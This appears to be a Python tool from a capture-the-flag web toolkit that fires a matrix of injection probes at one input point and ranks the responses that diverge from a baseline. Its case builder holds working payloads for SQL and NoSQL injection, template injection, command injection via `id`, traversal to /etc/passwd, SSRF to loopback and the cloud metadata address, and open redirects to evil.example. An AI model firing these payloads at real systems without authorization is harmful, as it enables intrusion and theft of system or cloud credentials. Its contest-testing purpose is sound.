#!/usr/bin/env python3
"""Fire one structurally different payload shape per hypothesis at ONE input point and rank what diverged.

http_probe.py sends one probe and sanitizer_fuzz.py sweeps encodings of one byte
through one field. Neither answers the question that actually opens a web
challenge: *which mechanism does this input point react to at all?* Under contest
time pressure that question gets answered by hand-writing twenty curl lines - a
quote, a double brace, a dollar brace, a semicolon, a dot-dot, an operator object
- squinting at twenty bodies, and losing the ones that came back identical. The
identical ones are the finding: "0 of 6 traversal shapes diverged" is a mechanism
layer closed, and it is only recordable if the count was kept. This tool sends the
whole matrix once, scores every case against one baseline taken first, keeps the
negatives with their counts, and hands the strongest case to tools/hooks.py
post-probe with a verbatim excerpt.

It is a CLASS ROUTER, not an exploit. A divergence says which depth skill to open;
only a marker hit (the ssti product, `uid=` from `id`, `root:x:` from passwd, the
redirect host in Location) is class-level evidence, and even that is not impact.

Three things about that hand-off are checked rather than asserted, because each one
is a way to put a false result in the ledger. The excerpt must be a verbatim
substring of the part of the response it NAMES, and it must CONTAIN the marker the
verdict rests on - a marker that fired in Location while the quote came from the
body is downgraded to inconclusive, not offered as `--verdict confirms`. The
accounting must match what the run did, so `--max-cases` keeps the full expressible
count, says it truncated, and refuses to call a partly-sent family closed. And a
shape the transport cannot carry through the chosen selector - a bare newline
through `--header` dies in http.client - is skipped with that reason instead of
spending one of the matrix's requests on a guaranteed ValueError.

One injection point per run, one request per case, strictly sequential, `--delay`
between them: a shared challenge instance is easy to kill with load. Requests do
not follow redirects by default - a 302 is itself a divergence signal, and
following it washes out the status and length deltas everything here is scored on.

    # black-box: which of 48 shapes does ?q= react to at all
    python3 tools/web/variant_matrix.py --url 'http://t/search?q=x' \\
        --param q --base x --challenge mychal --hypothesis-id h1

    # inspect the matrix before firing anything
    python3 tools/web/variant_matrix.py --url 'http://t/api/login' \\
        --json-field user.name --base admin --dry-run

    # one family only, into a JSON body (a write: needs --write-ack)
    python3 tools/web/variant_matrix.py --url 'http://t/api/login' \\
        --json-field user.name --body '{"user":{"name":"admin","pw":"x"}}' \\
        --families nosql-operator --write-ack --delay 0.2
"""
import argparse
import copy
import json
import os
import re
import shlex
import socket
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import httpkit  # noqa: E402

# Two primes, so the product is arithmetic that no template engine could have
# produced by echoing the input, and an 8-digit string that does not occur in a
# normal page the way 49 does (prices, counts, byte totals).
SSTI_A, SSTI_B = 7919, 6421
SSTI_PRODUCT = SSTI_A * SSTI_B                                       # 50847899

FAMILIES = ("sql-boolean", "sql-error", "nosql-operator", "ssti-arith", "cmdi",
            "traversal", "proto-pollution", "type-confusion", "ssrf-local",
            "redirect")

# The class a divergence in this family points at. A starting hypothesis for
# skill_select.py, never a conclusion - every id here exists in
# knowledge/bug-classes.json, and where one family genuinely straddles two
# classes both are listed so the report does not pretend to have decided.
FAMILY_CLASS = {
    "sql-boolean": ("web-sqli", ["web-sqli", "web-nosqli"]),
    "sql-error": ("web-sqli", ["web-sqli"]),
    "nosql-operator": ("web-nosqli", ["web-nosqli", "web-logic-flaw"]),
    "ssti-arith": ("web-ssti", ["web-ssti"]),
    "cmdi": ("web-command-injection", ["web-command-injection", "web-ssti"]),
    "traversal": ("file-read-primitives", ["file-read-primitives"]),
    "proto-pollution": ("web-prototype-pollution", ["web-prototype-pollution"]),
    "type-confusion": ("web-logic-flaw",
                       ["web-logic-flaw", "web-nosqli", "web-deserialization"]),
    "ssrf-local": ("web-ssrf", ["web-ssrf"]),
    "redirect": ("web-open-redirect", ["web-open-redirect", "web-ssrf"]),
}

# Substrings a real datastore puts in a real error. Presence is a class signal;
# absence proves nothing, because most apps catch and hide the error.
SQL_ERROR_MARKERS = ("SQL syntax", "SQLSTATE", "sqlite3.", "psycopg2",
                     "ORA-0", "unterminated quoted string", "You have an error",
                     "unrecognized token", "Unclosed quotation mark")

# hooks.py refuses these as confirmations; mirror the rule locally so a case is
# never even proposed as a confirm on a dead connection.
NEVER_CONFIRMATIONS = re.compile(
    r"time.?out|timed?\s*out|connection\s*(reset|refused)|no\s+response|"
    r"empty\s+response|http[_ ]?000", re.I)

# Which selectors a case can physically be expressed through.
#   None    a plain scalar: every selector carries it
#   keyed   needs a key the target's parser turns into a container
#           (`p[$ne]=`, `p[]=`) or a JSON value slot - so param/form/json only
#   json    only meaningful as a JSON structure in the body
KIND_ACCEPTS = {"json": (None, "keyed", "json"), "param": (None, "keyed"),
                "form": (None, "keyed"), "header": (None,), "path": (None,)}
KIND_DEFAULT_METHOD = {"param": "GET", "path": "GET", "header": "GET",
                       "json": "POST", "form": "POST"}
WRITE_METHODS = ("POST", "PUT", "PATCH", "DELETE")
NO_OBJ = object()                      # a case with no JSON form, distinct from None


def _case(family, shape, value=None, obj=NO_OBJ, key_suffix="", needs=None,
          engine=None, detect=(), detect_headers=(), preencoded=False, note=None):
    return {"family": family, "shape": shape, "value": value, "obj": obj,
            "key_suffix": key_suffix, "needs": needs, "engine": engine,
            "detect": list(detect), "detect_headers": [list(h) for h in detect_headers],
            "preencoded": preencoded, "note": note}


def build_cases(base="ctfv2", redirect_host="evil.example", probe_key="ctfv2pp",
                ssrf_port=None, families=FAMILIES, target_netloc="target.example"):
    """The whole matrix, deterministically. Nothing here calls random."""
    loop = lambda host: "http://%s%s/" % (host, ":%d" % ssrf_port if ssrf_port else "")
    out = []

    if "sql-boolean" in families:
        # Sent as pairs. The discriminating signal for boolean SQLi is the TRUE
        # member differing from the FALSE member, not either differing from the
        # baseline - see boolean_pairs in the report.
        out += [
            _case("sql-boolean", "single-quote-true", value="' OR '1'='1"),
            _case("sql-boolean", "single-quote-false", value="' AND '1'='2"),
            _case("sql-boolean", "double-quote-true", value='" OR "1"="1'),
            _case("sql-boolean", "double-quote-false", value='" AND "1"="2'),
            _case("sql-boolean", "numeric-true", value="1 OR 1=1"),
            _case("sql-boolean", "numeric-false", value="1 AND 1=2"),
        ]
    if "sql-error" in families:
        out += [
            _case("sql-error", "unbalanced-single-quote", value="'",
                  detect=SQL_ERROR_MARKERS),
            _case("sql-error", "unbalanced-double-quote", value='"',
                  detect=SQL_ERROR_MARKERS),
            _case("sql-error", "stray-close-paren", value=")",
                  detect=SQL_ERROR_MARKERS),
            # a trailing backslash breaks the NEXT quote the app adds, which is
            # how a driver that escapes quotes but not backslashes gives itself up
            _case("sql-error", "trailing-backslash", value="\\",
                  detect=SQL_ERROR_MARKERS),
        ]
    if "nosql-operator" in families:
        out += [
            _case("nosql-operator", "not-equal", value="", key_suffix="[$ne]",
                  obj={"$ne": None}, needs="keyed"),
            _case("nosql-operator", "greater-than", value="", key_suffix="[$gt]",
                  obj={"$gt": ""}, needs="keyed"),
            _case("nosql-operator", "regex-any", value=".*", key_suffix="[$regex]",
                  obj={"$regex": ".*"}, needs="keyed"),
            _case("nosql-operator", "where-true", value="return true",
                  key_suffix="[$where]", obj={"$where": "return true"},
                  needs="keyed",
                  note="$where needs server-side JS enabled; a 500 here is still "
                       "a signal that the value reached the query"),
        ]
    if "ssti-arith" in families:
        product = str(SSTI_PRODUCT)
        # One marker per SYNTAX, so a divergence names the engine family instead
        # of stopping at "template injection". The spec's hash-brace form is
        # Thymeleaf/Pug/Ruby interpolation, NOT Razor - Razor's own arithmetic
        # syntax is @(), so both are sent rather than mislabelling one as the other.
        for shape, payload, engine in (
                ("double-brace", "{{%d*%d}}" % (SSTI_A, SSTI_B),
                 "Jinja2 / Twig / Nunjucks / Liquid family"),
                ("dollar-brace", "${%d*%d}" % (SSTI_A, SSTI_B),
                 "JSP EL / Freemarker / Spring SpEL / JS template literal"),
                ("percent-equals", "<%%= %d*%d %%>" % (SSTI_A, SSTI_B),
                 "ERB / EJS / classic ASP"),
                ("hash-brace", "#{%d*%d}" % (SSTI_A, SSTI_B),
                 "Thymeleaf preprocessing / Pug / Ruby interpolation"),
                ("bare-brace", "{%d*%d}" % (SSTI_A, SSTI_B),
                 "bare single brace: .NET composite / str.format family"),
                ("at-paren", "@(%d*%d)" % (SSTI_A, SSTI_B), "Razor")):
            out.append(_case("ssti-arith", shape, value=payload, engine=engine,
                             detect=(product,)))
    if "cmdi" in families:
        # `id` is read-only and its output (`uid=`) cannot be produced by
        # reflecting the payload, which `echo MARKER` cannot promise.
        for shape, sep in (("semicolon", ";"), ("pipe", "|"), ("ampersand", "&"),
                           ("dollar-paren-subshell", "$("), ("backtick", "`"),
                           ("newline", "\n")):
            if shape == "dollar-paren-subshell":
                payload = "%s$(id)" % base
            elif shape == "backtick":
                payload = "%s`id`" % base
            else:
                payload = "%s%sid" % (base, sep)
            out.append(_case("cmdi", shape, value=payload,
                             detect=("uid=", "gid=")))
    if "traversal" in families:
        up4 = "../../../../"
        out += [
            _case("traversal", "dotdot-forward-slash", value=up4 + "etc/passwd",
                  detect=("root:x:0:0", "daemon:x:")),
            _case("traversal", "dotdot-back-slash",
                  value="..\\..\\..\\..\\windows\\win.ini",
                  detect=("[extensions]", "[fonts]")),
            # preencoded: the case IS the encoding, so the request builder must
            # not quote the '%' into '%25' and measure a different payload
            _case("traversal", "percent-encoded",
                  value="%2e%2e%2f" * 4 + "etc/passwd", preencoded=True,
                  detect=("root:x:0:0", "daemon:x:")),
            _case("traversal", "double-percent-encoded",
                  value="%252e%252e%252f" * 4 + "etc/passwd", preencoded=True,
                  detect=("root:x:0:0", "daemon:x:")),
            _case("traversal", "absolute-path", value="/etc/passwd",
                  detect=("root:x:0:0", "daemon:x:")),
            _case("traversal", "nul-suffixed", value=up4 + "etc/passwd\x00.png",
                  detect=("root:x:0:0", "daemon:x:"),
                  note="a NUL truncates in some C-backed path handlers and is "
                       "rejected outright by others; a transport failure here is "
                       "itself information about the stack"),
        ]
    if "proto-pollution" in families:
        out += [
            _case("proto-pollution", "dunder-proto",
                  obj={"__proto__": {probe_key: SSTI_PRODUCT}}, needs="json",
                  detect=(probe_key, str(SSTI_PRODUCT)),
                  note="pollution rarely shows in THIS response: the falsifier is a "
                       "follow-up read of an endpoint that defaults a missing "
                       "property, looking for %s" % probe_key),
            _case("proto-pollution", "constructor-prototype",
                  obj={"constructor": {"prototype": {probe_key: SSTI_PRODUCT}}},
                  needs="json", detect=(probe_key, str(SSTI_PRODUCT)),
                  note="reaches Object.prototype through a merge that filters the "
                       "__proto__ key by name only"),
        ]
    if "type-confusion" in families:
        out += [
            _case("type-confusion", "empty-array", value="", key_suffix="[]",
                  obj=[], needs="keyed"),
            _case("type-confusion", "one-element-array", value=base,
                  key_suffix="[]", obj=[base], needs="keyed"),
            _case("type-confusion", "object", value=base,
                  key_suffix="[ctfv2key]", obj={"ctfv2key": base}, needs="keyed"),
            _case("type-confusion", "null", value="null", obj=None,
                  note="through a query string this is the STRING 'null'; only "
                       "--json-field can send a real null"),
            _case("type-confusion", "boolean", value="true", obj=True,
                  note="through a query string this is the STRING 'true'"),
            # 2**63: the first value that overflows a signed 64-bit column or id
            _case("type-confusion", "large-integer", value="9223372036854775808",
                  obj=9223372036854775808),
        ]
    if "ssrf-local" in families:
        meta = "http://169.254.169.254/latest/meta-data/"
        out += [
            _case("ssrf-local", "loopback-by-name", value=loop("localhost")),
            _case("ssrf-local", "loopback-dotted", value=loop("127.0.0.1")),
            # 2130706433 == 0x7f000001; inet_aton accepts the bare integer
            _case("ssrf-local", "loopback-decimal-integer", value=loop("2130706433")),
            _case("ssrf-local", "loopback-zero", value=loop("0"),
                  note="'0' resolves to 0.0.0.0 in inet_aton and reaches the local "
                       "listener on Linux while matching no 127.* denylist"),
            _case("ssrf-local", "loopback-ipv6", value=loop("[::1]")),
            _case("ssrf-local", "cloud-link-local", value=meta,
                  detect=("ami-id", "instance-id", "iam/")),
        ]
    if "redirect" in families:
        out += [
            _case("redirect", "scheme-relative", value="//%s/" % redirect_host,
                  detect_headers=(("Location", redirect_host),)),
            _case("redirect", "absolute-external", value="https://%s/" % redirect_host,
                  detect_headers=(("Location", redirect_host),)),
            _case("redirect", "backslash-scheme-relative",
                  value="/\\%s/" % redirect_host,
                  detect_headers=(("Location", redirect_host),)),
            _case("redirect", "userinfo-at",
                  value="https://%s@%s/" % (target_netloc, redirect_host),
                  detect_headers=(("Location", redirect_host),),
                  note="the expected host is the userinfo, so a prefix check on the "
                       "string passes while the browser goes to %s" % redirect_host),
        ]

    for index, case in enumerate(out):
        case["id"] = "%s/%02d" % (case["family"], index)
        case["payload_repr"] = _repr_payload(case)
        primary, candidates = FAMILY_CLASS[case["family"]]
        case["class"] = primary
        case["candidate_classes"] = candidates
    return out


def _repr_payload(case):
    """A non-empty display string for every case, including the empty-value ones."""
    if case["obj"] is not NO_OBJ and case["needs"] in ("json", "keyed"):
        return json.dumps(case["obj"])
    if case["value"]:
        return case["value"]
    if case["key_suffix"]:
        return "<key %s with empty value>" % case["key_suffix"]
    return json.dumps(case["obj"]) if case["obj"] is not NO_OBJ else "<empty>"


# ------------------------------------------------------------------ request shape


def set_path(obj, dotted, value):
    """Set a dotted path in a dict, creating the intermediate dicts."""
    keys = dotted.split(".")
    cur = obj
    for key in keys[:-1]:
        if not isinstance(cur.get(key), dict):
            cur[key] = {}
        cur = cur[key]
    cur[keys[-1]] = value
    return obj


def _query_with(url, name, value, key_suffix, preencoded):
    parts = urllib.parse.urlsplit(url)
    pairs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    kept = [(k, v) for k, v in pairs if k != name and not k.startswith(name + "[")]
    key = name + key_suffix
    if preencoded:
        head = urllib.parse.urlencode(kept, safe="[]$") if kept else ""
        piece = "%s=%s" % (urllib.parse.quote(key, safe="[]$"), value)
        query = (head + "&" + piece) if head else piece
    else:
        query = urllib.parse.urlencode(kept + [(key, value)], safe="[]$")
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, query,
                                    parts.fragment))


def render(args, case_value, case_obj, key_suffix, preencoded):
    """-> (url, headers, body). One injection point, already validated."""
    url, headers, body = args.url, dict(args.base_headers), None
    kind = args.kind
    if kind == "param":
        url = _query_with(url, args.param, case_value, key_suffix, preencoded)
    elif kind == "path":
        placed = case_value if preencoded else urllib.parse.quote(case_value, safe="")
        url = url.replace(args.marker, placed)
    elif kind == "header":
        headers[args.header_name] = case_value
    elif kind == "form":
        pairs = urllib.parse.parse_qsl(args.body or "", keep_blank_values=True)
        kept = [(k, v) for k, v in pairs
                if k != args.form_field and not k.startswith(args.form_field + "[")]
        key = args.form_field + key_suffix
        if preencoded:
            head = urllib.parse.urlencode(kept, safe="[]$") if kept else ""
            piece = "%s=%s" % (urllib.parse.quote(key, safe="[]$"), case_value)
            body = (head + "&" + piece) if head else piece
        else:
            body = urllib.parse.urlencode(kept + [(key, case_value)], safe="[]$")
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif kind == "json":
        doc = copy.deepcopy(args.base_json)
        value = case_obj if case_obj is not NO_OBJ else case_value
        body = json.dumps(set_path(doc, args.json_field, value))
        headers.setdefault("Content-Type", "application/json")
    return url, headers, body


def request_line(method, url, headers, body):
    """The stable probe identity hooks.py de-duplicates on."""
    parts = ["%s %s" % (method, url)]
    for key, value in sorted(headers.items()):
        if key.lower() != "user-agent":
            parts.append("-H %s" % shlex.quote("%s: %s" % (key, value)))
    if body:
        parts.append("-d %s" % shlex.quote(body[:200]))
    return " ".join(parts)


# http.client refuses a bare CR or LF in a header value; the guard it uses is
# re.compile(rb'\n(?![ \t])|\r(?![ \t\n])') (read out of http.client on this box,
# Python 3.14.6), so an obs-fold "\r\n " is accepted and a bare "\n" is not.
# Measured against a local listener: 'ctfv2\nid' -> ValueError: Invalid header
# value b'ctfv2\nid'; 'ctfv2\n id' -> HTTP 200; 'ctfv2\x00.png' -> HTTP 200.
_ILLEGAL_HEADER_VALUE = re.compile(r"\n(?![ \t])|\r(?![ \t\n])")


def transport_blocker(kind, case):
    """-> a reason when the TRANSPORT cannot carry this shape through this selector.

    KIND_ACCEPTS only knows whether the target's parser could turn the shape into
    a container. A shape can clear that gate and still be unsendable: cmdi/newline
    through --header dies in http.client before a byte leaves, so counting it as
    expressible both overstates the matrix and spends a request on a guaranteed
    ValueError. Query, form, path and JSON selectors encode their value (urlencode,
    quote, json.dumps), so nothing is blocked there and this returns None.
    """
    if kind != "header":
        return None
    value = case["value"] or ""
    if _ILLEGAL_HEADER_VALUE.search(value):
        return ("a header injection point cannot carry this shape: http.client "
                "refuses a bare CR or LF in a header value (ValueError: Invalid "
                "header value), so it never reaches the wire")
    try:
        value.encode("latin-1")
    except UnicodeEncodeError as exc:
        return ("a header injection point cannot carry this shape: a header value "
                "must encode to latin-1 and this one does not (%s)" % exc)
    return None


# ---------------------------------------------------------------------- scoring


def header_values(resp, name):
    """Every value of a repeated header, not only the last one.

    httpkit's `headers` is a collapsed dict, so three Set-Cookie headers become
    one and a marker sitting in the first of them is invisible. `headers_all`
    keeps order and duplicates; fall back to the collapsed dict when a caller
    hands in a response dict that predates it.
    """
    pairs = resp.get("headers_all")
    if pairs:
        return [v for k, v in pairs if k.lower() == name.lower()]
    value = resp.get("headers", {}).get(name)
    return [] if value is None else [value]


def header_blob(resp):
    pairs = resp.get("headers_all") or list(resp.get("headers", {}).items())
    return "\n".join("%s: %s" % (k, v) for k, v in pairs)


def excerpt(text, needle, context):
    if needle and needle in text:
        index = text.find(needle)
        return text[max(0, index - context):index + len(needle) + context]
    return text[:context * 2]


def verify_excerpt(snippet, marker, source, resp):
    """Check a quoted excerpt against the part of the response it CLAIMS to be from.

    `snippet in body or snippet in header_blob(resp)` is a tautology - excerpt()
    returns a slice of the very text it was handed, so either arm matches by
    construction and the field can essentially never be False. The two facts
    hooks.py would actually rely on are different:

    * `excerpt_is_verbatim` - the excerpt is a substring of the source it NAMES,
      so a quote taken from the body while the report says `headers` is caught
      instead of being blessed;
    * `marker_in_excerpt` - the excerpt actually CONTAINS the marker the verdict
      rests on. A `confirms` whose --evidence omits the proof is exactly the
      rounding-up the write gate exists to stop, and it is the failure that a
      body-sourced excerpt for a Location-only marker produces.

    Returns the three report fields; `marker_in_excerpt` is None when there is no
    marker, because then there is nothing for the excerpt to contain.
    """
    origin = header_blob(resp) if source == "headers" else resp.get("body", "")
    return {"excerpt_source": source,
            "excerpt_is_verbatim": bool(snippet) and snippet in origin,
            "marker_in_excerpt": (marker in snippet) if marker else None}


def score_case(case, resp, baseline, args, needle):
    """-> (points, reasons, marker, excerpt, source). points == 0 means no divergence."""
    if not resp["ok"]:
        return 0, ["transport failure: %s" % resp.get("error")], None, "", None
    body = resp["body"]
    points, reasons, marker, source = 0, [], None, "body"

    body_hits = [m for m in case["detect"] if m in body]
    if body_hits:
        marker = body_hits[0]
        points += 100
        reasons.append("marker %r present in the body" % marker)
    for header, literal in case["detect_headers"]:
        # every value of a repeated header, not just the collapsed last one
        if any(literal in (value or "") for value in header_values(resp, header)):
            points += 100
            reasons.append("marker %r present in the %s header" % (literal, header))
            if marker is None:
                # The excerpt has to be quoted from where the marker actually is:
                # a redirect's proof lives in Location, and handing hooks.py a body
                # excerpt that does not contain the marker is exactly the rounding-up
                # the write gate exists to stop.
                marker, source = literal, "headers"

    if resp["status"] != baseline["status"]:
        points += 30
        reasons.append("status %s vs baseline %s" % (resp["status"],
                                                     baseline["status"]))
    delta = abs(resp["length"] - baseline["length"])
    if delta > args.length_threshold:
        points += 20
        reasons.append("length %d vs baseline %d (delta %d > %d)"
                       % (resp["length"], baseline["length"], delta,
                          args.length_threshold))
    signature = httpkit.body_signature(body)
    if signature["markers"] != baseline["signature"]["markers"]:
        points += 15
        reasons.append("signature markers %s vs baseline %s"
                       % (signature["markers"], baseline["signature"]["markers"]))
    location = resp["headers"].get("Location")
    if (location or "") != (baseline["location"] or ""):
        points += 25
        reasons.append("Location %r vs baseline %r" % (location,
                                                       baseline["location"]))
    # A blind sleep is the only divergence that leaves the body untouched, so it
    # needs both a ratio and an absolute floor: on loopback the ratio alone turns
    # ordinary jitter into a finding.
    if (resp["elapsed"] - baseline["elapsed"] >= args.timing_floor
            and resp["elapsed"] >= baseline["elapsed"] * args.timing_factor):
        points += 25
        reasons.append("timing outlier: %.3fs vs baseline %.3fs"
                       % (resp["elapsed"], baseline["elapsed"]))
    # Reflection is real but weak, and only meaningful for a needle long enough
    # that matching it is not an accident.
    reflected = bool(needle) and len(needle) >= 6 and needle in body
    if reflected and needle not in baseline["body_head"]:
        points += 10
        reasons.append("payload reflected verbatim in the body")
    text = header_blob(resp) if source == "headers" else body
    return points, reasons, marker, excerpt(text, marker, args.context), source


# ------------------------------------------------------------------- the matrix


def run_matrix(args, cases):
    sent, skipped = [], []
    accepts = KIND_ACCEPTS[args.kind]

    def skip(case, reason):
        skipped.append({"id": case["id"], "family": case["family"],
                        "shape": case["shape"],
                        "payload_repr": case["payload_repr"],
                        "skipped_because": reason})

    for case in cases:
        if case["needs"] not in accepts:
            skip(case, "a %s injection point cannot carry this shape: it needs %s"
                 % (args.kind,
                    "a JSON structure in the body (--json-field)"
                    if case["needs"] == "json" else
                    "a key the target parses into a container "
                    "(--param, --form-field or --json-field)"))
            continue
        blocker = transport_blocker(args.kind, case)
        if blocker:
            skip(case, blocker)
            continue
        sent.append(case)

    # The expressible count is the count BEFORE --max-cases, and the truncation is
    # reported rather than folded into it: a run that quietly renamed 48 shapes to 3
    # would understate its own matrix and the negative accounting built on it.
    expressible = len(sent)
    expressible_by_family = {}
    for case in sent:
        expressible_by_family[case["family"]] = \
            expressible_by_family.get(case["family"], 0) + 1
    withheld = 0
    if args.max_cases and expressible > args.max_cases:
        withheld = expressible - args.max_cases
        sent = sent[:args.max_cases]

    plan = []
    for case in sent:
        url, headers, body = render(args, case["value"], case["obj"],
                                    case["key_suffix"], case["preencoded"])
        entry = {"id": case["id"], "family": case["family"], "shape": case["shape"],
                 "payload_repr": case["payload_repr"], "class": case["class"],
                 "candidate_classes": case["candidate_classes"],
                 "method": args.method, "url": url, "body": body,
                 "headers": {k: v for k, v in headers.items()},
                 "request": request_line(args.method, url, headers, body)}
        if case["engine"]:
            entry["engine_implied"] = case["engine"]
        if case["note"]:
            entry["note"] = case["note"]
        if case["detect"]:
            entry["detect_markers"] = case["detect"]
        if case["detect_headers"]:
            entry["detect_header_markers"] = case["detect_headers"]
        plan.append((case, entry))
    accounting = {"cases_generated": len(cases), "cases_expressible": expressible,
                  "cases_skipped": len(skipped), "cases_planned": len(plan),
                  "truncated_by_max_cases": bool(withheld),
                  "cases_withheld_by_max_cases": withheld,
                  "_expressible_by_family": expressible_by_family}
    return plan, skipped, accounting


def baseline_request(args):
    url, headers, body = render(args, args.base, NO_OBJ, "", False)
    resp = httpkit.request(url, args.method, headers, body, timeout=args.timeout,
                           follow=args.follow)
    record = {"request": request_line(args.method, url, headers, body),
              "ok": resp["ok"], "status": resp.get("status"),
              "length": resp.get("length"), "elapsed": resp.get("elapsed"),
              "location": resp["headers"].get("Location") if resp["ok"] else None,
              "signature": httpkit.body_signature(resp.get("body", "")),
              "body_head": resp.get("body", "")[:args.body_chars],
              "error": resp.get("error")}
    return record


def boolean_pairs(results):
    """Boolean SQLi shows as TRUE differing from FALSE, not from the baseline."""
    by_shape = {r["shape"]: r for r in results if r["family"] == "sql-boolean"}
    pairs = []
    for name in ("single-quote", "double-quote", "numeric"):
        true_case, false_case = by_shape.get(name + "-true"), by_shape.get(name + "-false")
        if not (true_case and false_case):
            continue
        if not (true_case.get("status") and false_case.get("status")):
            pairs.append({"pair": name, "comparable": False,
                          "note": "one member did not complete"})
            continue
        differs = (true_case["status"] != false_case["status"]
                   or abs(true_case["length"] - false_case["length"]) > 0)
        pairs.append({"pair": name, "comparable": True, "differs": differs,
                      "true_result": "HTTP %s, %d bytes" % (true_case["status"],
                                                            true_case["length"]),
                      "false_result": "HTTP %s, %d bytes" % (false_case["status"],
                                                             false_case["length"])})
    return pairs


def post_probe_command(args, top):
    """The hooks.py line the top case justifies, with its verbatim excerpt."""
    verdict = "confirms"
    downgrades = []
    evidence = top.get("excerpt") or ""
    # The whole rule of this tool: a divergence names a layer, only a marker is
    # class-level evidence. It records its own refusal in `downgrades` rather than
    # just starting at "inconclusive", so the rule leaves a trace that a check can
    # assert on and its removal cannot pass unnoticed.
    if not top.get("marker"):
        verdict = "inconclusive"
        downgrades.append("no marker fired: a divergence names the mechanism layer "
                          "to open and is not class-level evidence")
    if verdict == "confirms" and NEVER_CONFIRMATIONS.search(evidence):
        verdict, _ = "inconclusive", downgrades.append(
            "the excerpt reads as a timeout or a dead connection")
    if verdict == "confirms" and not evidence.strip():
        verdict, _ = "inconclusive", downgrades.append("no verbatim excerpt to quote")
    # The proof has to be INSIDE the --evidence string. A marker that fired in a
    # Location header while the excerpt was sliced out of the body would otherwise
    # hand hooks.py a confirms whose evidence does not contain the thing it rests
    # on, which is a false confirmation no matter which line upstream went wrong.
    if verdict == "confirms" and not top.get("marker_in_excerpt"):
        verdict = "inconclusive"
        downgrades.append("the excerpt does not contain the marker %r the verdict "
                          "rests on, so --evidence would not carry the proof"
                          % top.get("marker"))
    if verdict == "confirms" and top.get("excerpt_is_verbatim") is not True:
        verdict = "inconclusive"
        downgrades.append("the excerpt is not a verbatim substring of the %s it "
                          "claims to be quoted from"
                          % (top.get("excerpt_source") or "response"))
    kind = "class" if verdict == "confirms" else "surface"
    challenge = args.challenge or "<challenge>"
    hypothesis = args.hypothesis_id or "<hypothesis-id>"
    argv = ["python3", "tools/hooks.py", "post-probe", challenge,
            "--request", top["request"],
            "--result", top["result"],
            "--verdict", verdict,
            "--evidence", evidence,
            "--evidence-kind", kind,
            "--class", args.probe_class or top["class"],
            "--hypothesis-id", hypothesis]
    return {"verdict": verdict, "evidence_kind": kind,
            # hooks.py never saw the response, so it cannot check the excerpt
            # itself. evidence_source names which part of the response it was
            # quoted from, evidence_is_verbatim says it is a substring of THAT
            # part, and evidence_contains_marker says the proof is inside the
            # string hooks.py will store. All three are checked by
            # verify_excerpt(), not asserted.
            "evidence_source": top.get("excerpt_source"),
            "evidence_is_verbatim": top.get("excerpt_is_verbatim"),
            "evidence_contains_marker": top.get("marker_in_excerpt"),
            "ready_to_run": bool(args.challenge and args.hypothesis_id),
            "downgrades": downgrades,
            "command": " ".join(shlex.quote(part) for part in argv),
            "argv": argv,
            "note": "a marker hit is class-level evidence; impact still has to be "
                    "shown separately" if verdict == "confirms" else
                    "no marker fired, so this is surface evidence at best"}


def main(argv=None):
    parser = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    parser.add_argument("--url", help="target URL (required unless --selftest)")
    parser.add_argument("--method", help="overrides the selector's default "
                                         "(GET for query/path/header, POST for "
                                         "json/form)")

    point = parser.add_argument_group(
        "injection point (exactly one; argparse rejects two, the check below "
        "rejects none)")
    # A mutually exclusive group is what makes "at most one" argparse's own rule
    # rather than a hand-written claim. It cannot express "at least one" here,
    # because --selftest legitimately takes no injection point, so the zero case
    # stays a post-parse parser.error and is covered by the selftest.
    one = point.add_mutually_exclusive_group()
    one.add_argument("--param", metavar="NAME", help="query-string parameter")
    one.add_argument("--json-field", metavar="PATH",
                     help="dotted path into a JSON body, e.g. user.name")
    one.add_argument("--form-field", metavar="NAME",
                     help="application/x-www-form-urlencoded field")
    one.add_argument("--header", dest="header_name", metavar="NAME",
                     help="request header value")
    one.add_argument("--path-marker", action="store_true",
                     help="substitute --marker inside the URL path")
    point.add_argument("--marker", default="MARK",
                      help="the literal --path-marker replaces (default MARK)")

    parser.add_argument("--base", default="ctfv2",
                        help="benign value for the baseline request, sent FIRST "
                             "and kept; every case is scored against it")
    parser.add_argument("--body", help="base request body: a JSON document with "
                                       "--json-field, form pairs with --form-field")
    parser.add_argument("-H", "--extra-header", action="append", default=[],
                        metavar="K: V", help="header sent with every request")
    parser.add_argument("--families", default=",".join(FAMILIES),
                        help="comma-separated subset of: " + ",".join(FAMILIES))
    parser.add_argument("--redirect-host", default="evil.example",
                        help="host for the redirect family; .example is reserved "
                             "by RFC 2606 and never resolves (default evil.example)")
    parser.add_argument("--ssrf-port", type=int,
                        help="port appended to the loopback SSRF forms; the app's "
                             "own listening port gives the strongest signal")
    parser.add_argument("--probe-key", default="ctfv2pp",
                        help="property name the prototype-pollution cases plant")

    tune = parser.add_argument_group("scoring")
    tune.add_argument("--length-threshold", type=int, default=16,
                      help="body-length delta that counts as a divergence")
    tune.add_argument("--timing-factor", type=float, default=3.0,
                      help="elapsed must exceed baseline by this ratio AND by "
                           "--timing-floor to be a timing outlier")
    tune.add_argument("--timing-floor", type=float, default=0.5,
                      help="absolute seconds above baseline (default 0.5)")
    tune.add_argument("--context", type=int, default=60,
                      help="characters of response kept around a marker")
    tune.add_argument("--top", type=int, default=5, help="length of the shortlist")

    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--delay", type=float, default=0.0,
                        help="seconds between requests; never any concurrency")
    parser.add_argument("--follow", action="store_true",
                        help="follow redirects (off by default: a 302 is itself "
                             "a divergence signal)")
    parser.add_argument("--max-cases", type=int, default=0,
                        help="cap the matrix; 0 = every expressible case")
    parser.add_argument("--body-chars", type=int, default=600,
                        help="how much of the baseline body is kept in the report")
    parser.add_argument("--dry-run", action="store_true",
                        help="print the whole matrix and send NOTHING")
    parser.add_argument("--write-ack", action="store_true",
                        help="acknowledge a write-shaped run after reading the "
                             "chain card's blast_radius")
    parser.add_argument("--challenge", help="challenge name, for the hooks.py line")
    parser.add_argument("--class", dest="probe_class",
                        help="override the bug class in the hooks.py line")
    parser.add_argument("--hypothesis-id", dest="hypothesis_id")
    parser.add_argument("--selftest", action="store_true")
    parser.add_argument("--compact", action="store_true")
    args = parser.parse_args(argv)
